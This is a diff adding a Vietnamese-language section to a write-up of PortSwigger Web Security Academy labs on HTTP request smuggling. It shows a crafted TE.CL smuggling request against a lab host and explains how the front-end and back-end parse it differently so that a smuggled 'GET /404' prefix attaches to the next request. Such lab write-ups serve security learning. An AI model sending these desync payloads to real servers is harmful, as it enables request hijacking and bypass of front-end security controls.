@@ -98,6 +98,36 @@ Host: 0aea0014046cafbbc16d670200f60046.web-security-academy.net
 Và kết quả, trả về 404 Not Found. Sau khi submit request, bài lab được giải thành công.
 
 # 5. HTTP request smuggling, confirming a TE.CL vulnerability via differential responses
+Để exploit lỗ hổng TE.CL, ta cấu hình đoạn request sau:
+```
+POST / HTTP/1.1
+Host: 0a1000dc03cf46e8c17a0d0100bf009b.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Transfer-Encoding: chunked
+
+5c
+GET /404 HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=
+0
+
+
+```
+Với front-end sử dụng TE, toàn bộ request trên sẽ được process và chuyển về cho back-end. Do back-end sử dụng CL `Content-Length: 4`, body của request đầu tiên sẽ chỉ bao gồm `5c\r\n`, và từ `GET /404...` đến hết số `0` sẽ được coi là 1 phần của request tiếp theo. Như vậy, nếu request tiếp theo là `GET /` thì nó sẽ trở thành:
+```
+GET /404 HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=
+0GET / HTTP/1.1
+Host: 0a1000dc03cf46e8c17a0d0100bf009b.web-security-academy.net
+...
+```
+Và kết quả sẽ trả về 404: Not Found. Sau khi submit request, kết quả thành công.
 
 # 6. Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
 
